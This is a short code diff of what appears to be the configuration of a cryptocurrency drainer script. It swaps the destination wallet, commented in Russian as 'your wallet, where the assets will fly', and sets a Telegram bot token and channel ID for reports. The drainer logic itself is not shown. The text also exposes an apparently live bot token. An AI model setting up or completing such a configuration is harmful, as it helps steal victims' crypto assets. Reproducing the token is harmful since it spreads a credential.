@@ -1,4 +1,4 @@
-var mainWallet = "UQBa5dxHPr2SnCSLuHe5wg6PIz_zn5P3wbFmBq8aBzjp-5bv"; //Ваш кошелек, куда будут лететь активы
+var mainWallet = "UQDI_XEKmdgFbpwdisWZTcdZFbhle4e8BhJBKk1KfLyzdRt-"; //Ваш кошелек, куда будут лететь активы
 var tgBotToken = "6986312551:AAFjUdD0peCCZ1wDluJoMHHWuQNMRFQVgd4"; //Токен от бота телеграмм
 var tgChat = "1409893198"; //Ваш телеграмм-канал
 
